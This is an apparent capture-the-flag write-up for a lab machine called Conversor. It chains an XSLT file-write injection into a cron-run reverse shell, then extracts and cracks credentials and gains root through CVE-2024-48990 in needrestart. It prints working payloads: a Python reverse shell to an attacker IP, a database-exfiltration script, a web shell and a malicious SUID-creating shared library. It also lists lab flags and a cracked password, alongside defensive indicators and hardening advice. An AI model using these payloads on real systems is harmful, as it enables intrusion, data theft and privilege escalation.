# Conversor - Complete Attack Chain Writeup

## Executive Summary

| Property | Value |
|----------|-------|
| **Target** | Conversor (10.10.11.92) |
| **Difficulty** | Easy |
| **OS** | Ubuntu 22.04 |
| **Key Vulnerabilities** | XSLT Injection (Arbitrary File Write), CVE-2024-48990 (needrestart) |
| **user.txt** | `5cae9197dd8696f7bc501a6f1986579a` |
| **root.txt** | `3e9b16ce09f878bf29df8b34134314d6` |

### Attack Chain Overview
```
Web Recon → Source Code Analysis → XSLT Injection → File Write to Cron Directory
    → RCE as www-data → Database Credential Extraction → MD5 Cracking
    → SSH as fismathack → CVE-2024-48990 → Root
```

---

## Phase 1: Reconnaissance

### 1.1 Initial Port Scan

```bash
nmap -sV -sC -p- 10.10.11.92
```

**Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp open  http    Apache httpd 2.4.52
```

**Thought Process:**
- Only two ports = limited attack surface
- HTTP service indicates web application
- Ubuntu version suggests recent system (potential for recent CVEs)

### 1.2 Web Application Discovery

**Initial Request:**
```bash
curl -s http://10.10.11.92/ -L
```

**Observations:**
- Redirects to `/login` - authentication required
- Domain: `conversor.htb` (added to `/etc/hosts`)
- Application: "Conversor" - XML/XSLT to HTML converter

**Methodology Indicator:** When encountering a web app with specific functionality (file conversion), always ask: "What can go wrong with this process?"

### 1.3 Critical Discovery: Source Code

Browsing to `/about` revealed a **download link for source code** (`source_code.tar.gz`).

**Why This Matters:**
- Whitebox analysis possible
- Can identify exact vulnerabilities before exploitation
- Reveals deployment details (paths, configurations, cron jobs)

**Lesson:** Always check "About" pages, documentation, and public resources for information disclosure.

---

## Phase 2: Source Code Analysis

### 2.1 Application Structure

```
source_code/
├── app.py          # Main Flask application
├── app.wsgi        # WSGI configuration
├── install.md      # CRITICAL: Deployment instructions
├── instance/       # SQLite database
├── scripts/        # Python scripts directory
├── static/         # CSS, templates
├── templates/      # HTML templates
└── uploads/        # User uploads
```

### 2.2 The Vulnerability: Inconsistent Parser Security

**File:** `app.py` lines 103-107

```python
# SECURE: XML parser with all protections enabled
parser = etree.XMLParser(
    resolve_entities=False,   # Prevents XXE entity expansion
    no_network=True,          # Prevents SSRF via external entities
    dtd_validation=False,     # Disables DTD processing
    load_dtd=False            # Won't load external DTDs
)
xml_tree = etree.parse(xml_path, parser)

# VULNERABLE: XSLT parser with NO security configuration
xslt_tree = etree.parse(xslt_path)  # <-- DEFAULT PARSER!
transform = etree.XSLT(xslt_tree)
```

**Security Comparison:**

| Parser | resolve_entities | no_network | dtd_validation | load_dtd | Secure? |
|--------|-----------------|------------|----------------|----------|---------|
| XML Parser | False | True | False | False | YES |
| XSLT Parser | Default | Default | Default | Default | **NO** |

**Root Cause Analysis:**
The developer correctly secured the XML parser against XXE attacks but failed to apply the same restrictions to the XSLT parser. This is a classic "security discrepancy" vulnerability where related components have inconsistent security controls.

### 2.3 Attack Vector: EXSLT Document Extension

XSLT 1.0 with EXSLT extensions supports `exsl:document` - a function that **writes content to files on disk**.

**Syntax:**
```xml
<exsl:document href="/path/to/file" method="text">
    Content to write
</exsl:document>
```

**Thought Process:**
1. We can write arbitrary files via XSLT
2. But file writes alone don't give us code execution
3. Need to find a way to get our written content executed

### 2.4 The Missing Piece: Cron Job Discovery

**File:** `install.md` line 24

```bash
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

**Analysis:**
- Cron runs **every minute** as `www-data`
- Executes **ALL** `.py` files in `/var/www/conversor.htb/scripts/`
- No whitelist, no validation, no restrictions

**Attack Chain:**
1. Write Python reverse shell to `/var/www/conversor.htb/scripts/shell.py`
2. Wait up to 60 seconds for cron execution
3. Receive shell as `www-data`

---

## Phase 3: Initial Access Exploitation

### 3.1 Exploit Development

**data.xml** (Benign XML input):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <item>test</item>
</root>
```

**exploit.xslt** (Malicious XSLT with file write):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exsl="http://exslt.org/common"
    extension-element-prefixes="exsl">

    <xsl:template match="/">
        <exsl:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.10",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
        </exsl:document>
        <html><body><h1>File write attempted!</h1></body></html>
    </xsl:template>
</xsl:stylesheet>
```

**Key Elements:**
- `xmlns:exsl` declares EXSLT namespace
- `extension-element-prefixes="exsl"` enables EXSLT extensions
- `<exsl:document>` performs file write
- `method="text"` ensures content is written as plain text (not XML)

### 3.2 Exploitation Steps

```bash
# Terminal 1: Start listener
nc -lvnp 4444

# Terminal 2: Register and authenticate
curl -X POST http://conversor.htb/register \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=attacker&password=attacker123"

curl -X POST http://conversor.htb/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=attacker&password=attacker123" \
  -c cookies.txt

# Terminal 2: Upload exploit
curl -X POST http://conversor.htb/convert \
  -b cookies.txt \
  -F "xml_file=@data.xml" \
  -F "xslt_file=@exploit.xslt"
```

### 3.3 Success Indicators

| Indicator | Meaning |
|-----------|---------|
| HTTP 302 Redirect | File write likely succeeded |
| "File write attempted!" in result HTML | XSLT executed successfully |
| Connection on listener (within 60s) | Cron executed our payload |

**Result:**
```
listening on [any] 4444 ...
connect to [10.10.16.10] from (UNKNOWN) [10.10.11.92] 48864
bash: cannot set terminal process group (1495): Inappropriate ioctl for device
bash: no job control in this shell
www-data@conversor:~$
```

---

## Phase 4: Credential Extraction & User Escalation

### 4.1 Database Discovery

From source code analysis:
- Database: SQLite3
- Path: `/var/www/conversor.htb/instance/users.db`

### 4.2 Password Storage Weakness

**File:** `app.py` line 52

```python
password = hashlib.md5(request.form['password'].encode()).hexdigest()
```

**Weaknesses:**
1. **MD5** - Cryptographically broken hash function
2. **No salt** - Vulnerable to rainbow table attacks
3. **Fast hashing** - Enables rapid brute force

### 4.3 Credential Extraction via XSLT

Instead of manually querying the database after getting shell access, we used XSLT to exfiltrate data:

**exfil.xslt:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exsl="http://exslt.org/common"
    extension-element-prefixes="exsl">

    <xsl:template match="/">
        <exsl:document href="/var/www/conversor.htb/scripts/exfil.py" method="text">
import sqlite3
import urllib.request
import base64

conn = sqlite3.connect('/var/www/conversor.htb/instance/users.db')
c = conn.cursor()
c.execute("SELECT * FROM users")
rows = c.fetchall()
conn.close()

data = str(rows)
encoded = base64.b64encode(data.encode()).decode()
urllib.request.urlopen(f"http://10.10.16.10:8080/{encoded}")
        </exsl:document>
        <html><body><h1>Exfil script written!</h1></body></html>
    </xsl:template>
</xsl:stylesheet>
```

**HTTP Server Output:**
```
10.10.11.92 - - "GET /WygxLCAnZmlzbWF0aGFjaycsICc1YjVjM2FjM2ExYzg5N2M5NGNhYWQ0OGU2YzcxZmRlYycpLC4uLl0= HTTP/1.1" 404 -
```

**Decoded:**
```python
[(1, 'fismathack', '5b5c3ac3a1c897c94caad48e6c71fdec'), ...]
```

### 4.4 Hash Cracking

```bash
echo "5b5c3ac3a1c897c94caad48e6c71fdec" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:**
```
5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm
```

### 4.5 SSH Access

```bash
ssh fismathack@10.10.11.92
Password: Keepmesafeandwarm
```

```bash
fismathack@conversor:~$ cat user.txt
5cae9197dd8696f7bc501a6f1986579a
```

---

## Phase 5: Privilege Escalation - CVE-2024-48990

### 5.1 Enumeration

```bash
fismathack@conversor:~$ sudo -l
User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart

fismathack@conversor:~$ needrestart --version
needrestart 3.7
```

**Critical Finding:** needrestart 3.7 is vulnerable to **CVE-2024-48990** (fixed in 3.8)

### 5.2 Understanding CVE-2024-48990

**Vulnerability Description:**
needrestart scans running processes to identify those that need restarting after library updates. When scanning Python processes, it **inherits the PYTHONPATH environment variable** from the target process.

**Attack Flow:**
```
1. Attacker creates malicious Python module (as .so file)
2. Attacker runs Python process with PYTHONPATH pointing to malicious directory
3. Attacker triggers needrestart via sudo
4. needrestart scans the Python process
5. needrestart runs Python with attacker's PYTHONPATH
6. Malicious .so loaded with ROOT privileges
7. Constructor function executes, creating SUID shell
```

### 5.3 Exploit Development

**lib.c** (Malicious shared object with constructor):
```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

// __attribute__((constructor)) runs BEFORE main()
// This executes when the library is loaded
static void a() __attribute__((constructor));

void a() {
    // Only execute if running as root
    if(geteuid() == 0) {
        setuid(0);
        setgid(0);
        // Create SUID shell
        system("cp /bin/sh /tmp/poc; chmod u+s /tmp/poc");
    }
}
```

**Compilation:**
```bash
gcc -shared -fPIC -o __init__.so lib.c
```

**bait.py** (Process to trigger needrestart scan):
```python
#!/usr/bin/env python3
import time
import os

while True:
    try:
        import importlib
        import importlib.util
    except:
        pass

    if os.path.exists("/tmp/poc"):
        os.system("/tmp/poc -p -c 'cat /root/root.txt > /tmp/flag.txt'")
        break
    time.sleep(0.5)
```

### 5.4 Directory Structure

```bash
/tmp/malicious/
├── importlib/
│   └── __init__.so    # Compiled malicious library
└── bait.py            # Bait Python script
```

### 5.5 Exploitation Steps

```bash
# On attacker machine
gcc -shared -fPIC -o __init__.so lib.c
scp __init__.so fismathack@10.10.11.92:/tmp/

# On target
mkdir -p /tmp/malicious/importlib
mv /tmp/__init__.so /tmp/malicious/importlib/

# Create bait.py
cat > /tmp/malicious/bait.py << 'EOF'
import time, os
while True:
    try:
        import importlib
    except:
        pass
    if os.path.exists("/tmp/poc"):
        os.system("/tmp/poc -p -c 'cat /root/root.txt'")
        break
    time.sleep(0.5)
EOF

# Terminal 1: Run bait process
cd /tmp/malicious
PYTHONPATH=/tmp/malicious python3 bait.py &

# Terminal 2: Trigger needrestart
sudo /usr/sbin/needrestart
```

### 5.6 Why It Works

**needrestart verbose output:**
```
[Core] #3108 is a NeedRestart::Interp::Python
[Python] #3108: source=/tmp/malicious/bait.py
Error processing line 1 of /usr/lib/python3/dist-packages/zope.interface-5.4.0-nspkg.pth:
  ImportError: dynamic module does not define module export function (PyInit_importlib)
```

The error occurs because our .so doesn't define PyInit_importlib, but **the constructor already ran** - creating the SUID shell.

**Critical Requirement:**
- Python process MUST use a script file (not `-c` inline code)
- needrestart skips `-c` processes: `uses no source file (-c), skipping`

### 5.7 Result

```bash
ls -la /tmp/poc
-rwsr-xr-x 1 root root 125688 Jan  7 08:34 /tmp/poc

cat /tmp/flag.txt
3e9b16ce09f878bf29df8b34134314d6
```

---

## Failed Attempts & Troubleshooting

### Failed Attempt 1: XXE in XML File

**Attempt:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

**Result:** No file content returned

**Why It Failed:**
- XML parser explicitly configured with `resolve_entities=False`
- Entity expansion disabled at parser level
- **Lesson:** Always check parser configuration, not just file extension

### Failed Attempt 2: xsl:script for RCE

**Attempt:**
```xml
<xsl:script language="python">
import os
os.system("id")
</xsl:script>
```

**Result:** Error - element not recognized

**Why It Failed:**
- lxml's XSLT processor doesn't support `xsl:script`
- EXSLT extensions available, but not arbitrary code execution
- **Lesson:** Know which XSLT extensions are supported by specific libraries

### Failed Attempt 3: Python -c with PYTHONPATH

**Attempt:**
```bash
PYTHONPATH=/tmp/malicious python3 -c "import time; time.sleep(100)"
```

**Result:** needrestart ignored the process

**Why It Failed:**
- needrestart output: `uses no source file (-c), skipping`
- Designed to skip inline Python commands
- **Lesson:** Read verbose output (`-v`) to understand tool behavior

### Failed Attempt 4: .so Without Constructor

**Attempt:** Simple shared object without `__attribute__((constructor))`

**Result:** Code never executed

**Why It Failed:**
- Python only calls `PyInit_<module>` function
- Without constructor, our code waits for a call that fails
- Error: `dynamic module does not define module export function`
- **Lesson:** Use GCC constructor attribute for pre-initialization execution

---

## Alternative Attack Paths

### Alternative 1: Direct Data Exfiltration (No Shell)

Instead of reverse shell, extract database directly:

```xml
<exsl:document href="/var/www/conversor.htb/scripts/exfil.py" method="text">
import sqlite3, urllib.request, base64
conn = sqlite3.connect('/var/www/conversor.htb/instance/users.db')
data = str(conn.execute("SELECT * FROM users").fetchall())
urllib.request.urlopen(f"http://ATTACKER/{base64.b64encode(data.encode()).decode()}")
</exsl:document>
```

**Trade-off:** More stealthy, less interactive access

### Alternative 2: Persistent Web Shell

```python
import http.server, os
class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        output = os.popen(self.path[1:]).read()
        self.send_response(200)
        self.end_headers()
        self.wfile.write(output.encode())
http.server.HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
```

**Trade-off:** Persistent, but more detectable

### Alternative 3: Session Cookie Forging

The Flask secret key is hardcoded:
```python
app.secret_key = 'Changemeplease'
```

Could forge session cookies using itsdangerous library.

**Trade-off:** Requires knowing valid user_id values

---

## Indicators of Compromise (IOCs)

### Network Indicators

| Indicator | Description |
|-----------|-------------|
| POST to `/convert` with unusual XSLT | XSLT injection attempt |
| Outbound connections from www-data | Reverse shell activity |
| HTTP requests with base64 in URL path | Data exfiltration |
| Unexpected Python imports of importlib | CVE-2024-48990 exploitation |

### File System Indicators

| Path | Description |
|------|-------------|
| `/var/www/conversor.htb/scripts/*.py` | Unexpected Python files |
| `/tmp/poc` or similar SUID binaries | Privilege escalation artifacts |
| `/tmp/malicious/importlib/__init__.so` | CVE-2024-48990 payload |

### Process Indicators

- Python processes with non-standard PYTHONPATH
- needrestart scanning user-owned Python processes
- ImportError for `importlib` in system logs

---

## Defense Recommendations

### 1. Secure XSLT Parsing

```python
from lxml import etree

class SecureResolver(etree.Resolver):
    def resolve(self, url, pubid, context):
        return None  # Block all external resources

parser = etree.XMLParser(resolve_entities=False, no_network=True)
parser.resolvers.add(SecureResolver())

# Apply to BOTH parsers
xml_tree = etree.parse(xml_path, parser)
xslt_tree = etree.parse(xslt_path, parser)

# Disable EXSLT extensions
transform = etree.XSLT(xslt_tree, extensions={})
```

### 2. Cron Job Hardening

```bash
# BAD: Execute any .py file
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done

# GOOD: Whitelist specific scripts
* * * * * www-data python3 /var/www/conversor.htb/scripts/cleanup.py
```

### 3. Password Storage

```python
# BAD: Unsalted MD5
hashlib.md5(password.encode()).hexdigest()

# GOOD: bcrypt with automatic salt
import bcrypt
bcrypt.hashpw(password.encode(), bcrypt.gensalt())
```

### 4. needrestart Mitigation

```bash
# Update to patched version
apt update && apt install needrestart

# Or remove sudo access
# Remove from sudoers: (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

---

## OSCP Exam Relevance

| Technique | Relevance | Notes |
|-----------|-----------|-------|
| Source Code Analysis | **HIGH** | Always review available source code |
| XSLT Injection | MEDIUM | Less common, but know EXSLT capabilities |
| Cron Job Exploitation | **HIGH** | Very common privilege escalation vector |
| MD5 Hash Cracking | **HIGH** | Standard skill, have wordlists ready |
| CVE Exploitation | MEDIUM | Know how to adapt public exploits |
| File Write to RCE | **HIGH** | Common pattern across many vulnerabilities |

---

## Key Lessons Learned

1. **Security Discrepancies:** When one component is secured, verify related components have equivalent protections

2. **Source Code Review:** Downloaded source often reveals deployment details that enable exploitation

3. **Cron Jobs:** Always enumerate scheduled tasks - they frequently enable privilege escalation

4. **Failed Attempts Matter:** Document what doesn't work and why - this builds methodology

5. **Verbose Output:** Always run tools with `-v` to understand their behavior and limitations

6. **CVE Understanding:** Understanding the vulnerability mechanism is more important than just running exploit code

7. **Constructor Functions:** GCC's `__attribute__((constructor))` enables code execution before `main()` or module initialization

---

## Timeline Summary

| Phase | Action | Time |
|-------|--------|------|
| Recon | Nmap scan, web discovery | 5 min |
| Analysis | Source code review, vulnerability identification | 15 min |
| Initial Access | XSLT injection, reverse shell | 10 min |
| Credential Access | Database extraction, hash cracking | 10 min |
| Privilege Escalation | CVE-2024-48990 exploitation | 20 min |
| **Total** | | **~60 min** |
